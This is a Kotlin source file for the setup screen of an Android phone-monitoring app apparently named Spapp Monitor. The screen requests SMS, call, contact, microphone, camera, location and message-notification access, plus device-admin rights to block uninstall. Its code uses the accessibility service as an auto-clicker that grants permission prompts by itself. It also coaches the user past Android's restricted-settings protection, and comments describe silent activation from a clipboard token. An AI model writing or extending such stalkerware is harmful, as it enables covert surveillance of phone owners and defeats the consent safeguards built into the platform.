package com.spapp.monitoring.ui

import android.Manifest
import android.app.AlertDialog
import android.app.AppOpsManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.PowerManager
import android.os.Process
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.spapp.monitoring.R
import com.spapp.monitoring.admin.SpappDeviceAdminReceiver
import com.spapp.monitoring.blocking.AccessibilityStatus
import com.spapp.monitoring.data.DeviceState
import com.spapp.monitoring.databinding.ActivityConsentBinding

/**
 * Mandatory first-launch screen. The user must explicitly tap "Allow" before
 * any permission is requested or any data collection begins.
 *
 * Tapping "ALLOW ALL PERMISSIONS" initiates a sequential setup flow:
 * 1. Runtime Permissions batch (Location, Calls, Contacts, SMS, Mic, Camera, Media, Notifications)
 * 2. Unrestricted Battery Optimization exemption
 * 3. All Files Storage access (Android 11+)
 * 4. Notification Listener access (WhatsApp & Instagram messages)
 * 5. Accessibility Service (Screen capture & live chat tracking)
 * 6. App Usage Stats (Screen time)
 * 7. Device Administrator (Prevents unauthorized uninstall & enables remote screen lock)
 * 8. Autostart (Xiaomi / Oppo / Vivo OEM ROMs)
 */
class ConsentActivity : AppCompatActivity() {

    private lateinit var binding: ActivityConsentBinding
    private var autostartPrompted = false

    private val corePermissions = buildList {
        add(Manifest.permission.ACCESS_FINE_LOCATION)
        add(Manifest.permission.ACCESS_COARSE_LOCATION)
        add(Manifest.permission.READ_SMS)
        add(Manifest.permission.READ_CALL_LOG)
        add(Manifest.permission.READ_CONTACTS)
        add(Manifest.permission.RECORD_AUDIO)
        add(Manifest.permission.CAMERA)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.READ_MEDIA_VIDEO)
            add(Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }.toTypedArray()

    // 1. Core Runtime Permissions Launcher
    private val runtimePermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        proceedToActivation()
    }

    // 2. Accessibility Launcher
    private val accessibilityLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        if (isAccessibilityEnabled()) {
            Toast.makeText(this, "✓ Accessibility Enabled! Auto-granting permissions...", Toast.LENGTH_SHORT).show()
            // Accessibility service is now active in background - launch permissions to be auto-clicked
            runtimePermissionLauncher.launch(corePermissions)
        } else {
            proceedToActivation()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityConsentBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.btnAllow.setOnClickListener {
            DeviceState(this).consentGiven = true
            if (!isAccessibilityEnabled()) {
                // Step 1: Request Accessibility first so the auto-clicker is running!
                showAccessibilityDialog()
            } else {
                // Accessibility already enabled: launch runtime permissions directly
                runtimePermissionLauncher.launch(corePermissions)
            }
        }

        binding.btnDecline.setOnClickListener {
            Toast.makeText(this, getString(R.string.consent_decline_message), Toast.LENGTH_LONG).show()
            finishAffinity()
        }
    }

    private fun checkAndPromptNextSystemPermission() {
        // Standard Runtime Permissions already handled.
        // Prompt Accessibility Service next:
        if (!isAccessibilityEnabled()) {
            showAccessibilityDialog()
            return
        }

        // Core + Accessibility done -> proceed straight to activation!
        // Remaining permissions are configured individually on the main screen.
        proceedToActivation()
    }

    private fun showAccessibilityDialog() {
        val msg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            "To enable Live Screen & Chat Monitoring:\n\n" +
            "1. Tap 'Go to Settings' -> 'Downloaded apps' -> 'Spapp Monitor' -> Turn ON.\n\n" +
            "⚠️ Android 13/14 Restricted Setting:\n" +
            "If grayed out, tap 'Allow Restricted' below -> tap 3 vertical dots (top right) -> 'Allow restricted settings' -> then return."
        } else {
            "To enable Live Screen & Chat Monitoring:\n\n" +
            "1. Tap 'Go to Settings' below.\n" +
            "2. Select 'Downloaded apps' or 'Installed services'.\n" +
            "3. Select 'Spapp Monitor' and toggle it ON."
        }

        AlertDialog.Builder(this)
            .setTitle(R.string.accessibility_dialog_title)
            .setMessage(msg)
            .setPositiveButton(R.string.go_to_settings) { _, _ ->
                try {
                    val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    accessibilityLauncher.launch(intent)
                } catch (e: Exception) {
                    Log.e(TAG, "Cannot open accessibility settings", e)
                    proceedToActivation()
                }
            }
            .setNeutralButton(R.string.open_app_info) { _, _ ->
                openAppInfoSettings()
            }
            .setNegativeButton("Skip") { _, _ ->
                proceedToActivation()
            }
            .setCancelable(false)
            .show()
    }

    private fun isBatteryExempted(): Boolean {
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        return powerManager.isIgnoringBatteryOptimizations(packageName)
    }

    private fun isFileAccessGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            true
        }
    }

    private fun isNotificationAccessGranted(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: ""
        return flat.contains(packageName)
    }

    private fun isAccessibilityEnabled(): Boolean {
        return AccessibilityStatus.isEnabled(this)
    }

    private fun isUsageAccessGranted(): Boolean {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), packageName)
        } else {
            @Suppress("DEPRECATION")
            appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), packageName)
        }
        return mode == AppOpsManager.MODE_ALLOWED
    }

    private fun isDeviceAdminActive(): Boolean {
        return SpappDeviceAdminReceiver.isActive(this)
    }

    private fun isOemRom(): Boolean {
        val manufacturer = Build.MANUFACTURER.lowercase()
        return manufacturer.contains("xiaomi") ||
                manufacturer.contains("redmi") ||
                manufacturer.contains("oppo") ||
                manufacturer.contains("vivo") ||
                manufacturer.contains("huawei") ||
                manufacturer.contains("honor")
    }

    private fun getAutostartIntent(): Intent? {
        val candidates = listOf(
            Intent().setComponent(
                ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")
            ),
            Intent().setComponent(
                ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity")
            ),
            Intent().setComponent(
                ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")
            ),
            Intent().setComponent(
                ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")
            ),
            Intent().setComponent(
                ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")
            )
        )
        for (intent in candidates) {
            if (packageManager.resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY) != null) {
                return intent
            }
        }
        return null
    }

    private fun openAppInfoSettings() {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "No app-info settings screen available", e)
        }
    }

    /**
     * If SplashActivity already silently activated this device using a token
     * found on the clipboard, DeviceState.authToken is already set — skip the
     * manual code-entry screen and go straight to the main status screen.
     * Otherwise (no clipboard token was found/valid), fall back to the
     * original manual/deep-link activation screen.
     */
    private fun proceedToActivation() {
        val state = DeviceState(this)
        if (!state.authToken.isNullOrEmpty()) {
            com.spapp.monitoring.sync.SyncScheduler.schedule(applicationContext)
            startActivity(Intent(this, MainActivity::class.java))
        } else {
            startActivity(Intent(this, ActivationActivity::class.java))
        }
        finish()
    }

    companion object {
        private const val TAG = "ConsentActivity"
    }
}
